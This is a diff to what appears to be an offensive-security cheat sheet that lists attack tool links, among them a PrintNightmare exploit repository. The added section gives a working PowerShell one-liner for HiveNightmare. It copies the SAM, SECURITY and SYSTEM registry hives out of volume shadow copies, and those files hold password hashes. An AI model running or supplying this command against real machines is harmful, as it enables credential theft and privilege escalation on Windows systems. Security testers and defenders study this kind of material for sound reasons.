@@ -15,6 +15,14 @@ https://lolbas-project.github.io/
 11. https://github.com/S3cur3Th1sSh1t/SharpNamedPipePTH
 12. https://github.com/cube0x0/CVE-2021-1675
 
+### HiveNightmare Powershell One Liner:
+https://twitter.com/splinter_code/status/1420546784250769408
+```
+powershell -c "foreach ($i in 1..10){$p='\\.\HarddiskVolumeShadowCopy{0}\windows\system32\config\' -f $i; gi $($p+'SAM'),$($p+'SECURITY'),$($p+'SYSTEM') -ErrorAction SilentlyContinue | % {cp $_.FullName $($_.BaseName+$i)}}"
+```
+
+
+
 ### System Nightmare Incognito 
 Install Packages if Needed.
 ```
